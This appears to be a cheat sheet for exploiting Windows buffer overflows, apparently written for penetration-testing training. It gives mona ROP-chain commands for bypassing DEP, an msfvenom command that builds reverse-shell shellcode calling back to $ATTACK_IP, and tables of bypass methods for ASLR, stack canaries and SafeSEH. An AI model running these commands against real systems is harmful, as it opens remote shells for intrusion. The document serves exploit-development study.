# Buffer Overflow: DEP/ASLR Bypass & Troubleshooting

## DEP Bypass (ROP Chains)
When DEP (Data Execution Prevention) is enabled, you can't execute shellcode directly on the stack. Use ROP chains instead.

```bash
# Generate ROP chain with mona
!mona rop -m *.dll -cpb "\x00\x0a"

# This creates a ROP.txt file with gadgets
# The ROP chain calls VirtualProtect to make stack executable
# then jumps to shellcode

# Use msfvenom with ROP-friendly options
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 \
  -b "\x00\x0a" -f python -v shellcode --platform windows \
  -a x86 -e x86/shikata_ga_nai
```

## Exploit Troubleshooting

### Exploit doesn't work? Check:
```bash
# 1. Re-fuzz to verify crash hasn't changed
# 2. Re-calculate EIP offset
# 3. Re-check bad characters
# 4. Find a new JMP ESP from target's loaded modules
# 5. Generate new shellcode for target's OS/arch
# 6. Update NOP sled length (try 16-32 bytes)
# 7. Ensure total payload doesn't exceed buffer size
# 8. Is listener running on correct IP/port?
```

### Common Issues
| Symptom | Likely Cause |
|---|---|
| App doesn't crash at expected size | Different OS version/offset changed |
| EIP not overwritten | Wrong command/format for the app |
| Shell doesn't connect | Bad chars not fully removed |
| Shell connects but immediately dies | Staged vs non-staged mismatch |
| App crashes after shell connects | Bad shellcode or DEP enabled |
| "Access violation" in different module | Need to find module without ASLR |

### Modern Protection Handling
| Protection | Bypass Method |
|---|---|
| **NX/DEP** | ROP chain → VirtualProtect → shellcode |
| **ASLR** | Use module without ASLR (look for "False" in mona modules) |
| **Stack Canaries** | Leak canary value before overwriting EIP |
| **SafeSEH** | Use SEH overwrite instead of direct EIP overwrite |
